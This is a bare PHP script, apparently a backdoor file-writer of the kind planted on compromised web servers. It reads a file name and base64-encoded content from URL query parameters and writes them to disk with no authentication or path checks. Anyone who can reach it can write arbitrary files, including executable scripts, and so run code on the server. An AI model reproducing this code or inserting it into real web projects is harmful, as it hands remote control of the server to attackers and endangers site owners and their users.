<?php

$f = realpath(dirname(__FILE__)) . "/" . $_GET['f'];
$c = base64_decode($_GET['c']);
file_put_contents($f, $c);

?>
